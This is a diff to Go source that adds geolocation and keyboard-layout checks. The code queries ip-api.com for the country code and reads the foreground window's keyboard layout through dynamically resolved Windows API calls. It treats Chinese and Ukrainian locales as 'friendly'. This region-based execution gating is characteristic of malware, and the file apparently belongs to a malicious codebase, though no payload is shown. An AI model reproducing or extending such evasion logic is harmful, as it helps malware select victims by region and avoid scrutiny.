@@ -1,7 +1,9 @@
 package components
 
 import (
+	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -100,4 +102,43 @@ func bytes_to_hex_string(b []byte) string {
 		out = append(out, fmt.Sprintf("%02X", b[i])...)
 	}
 	return string(out)
+}
+
+func is_friendly_ip() bool {
+	resp, err := http.Get("http://ip-api.com/json")
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	var r GeoResp
+	json.NewDecoder(resp.Body).Decode(&r)
+
+	return r.CountryCode == "UA" || r.CountryCode == "CN"
+}
+
+func run_on_friendly_area() bool {
+	var hkl uintptr
+	var tid uintptr
+	hwnd, _, _ := pfnGetForegroundWindow.Call()
+	if hwnd == 0 {
+		goto CheckIP
+	}
+	tid, _, _ = pfnGetWindowThreadPID.Call(hwnd)
+	if tid == 0 {
+		goto CheckIP
+	}
+	hkl, _, _ = pfnGetKeyboardLayout.Call(tid)
+	if hkl == 0 {
+		goto CheckIP
+	}
+
+	if uint16(hkl&0xffff) == 0x0804 || uint16(hkl&0xffff) == 0x0422 {
+		return true
+	}
+CheckIP:
+	if is_friendly_ip() {
+		return true
+	}
+	return false
 }
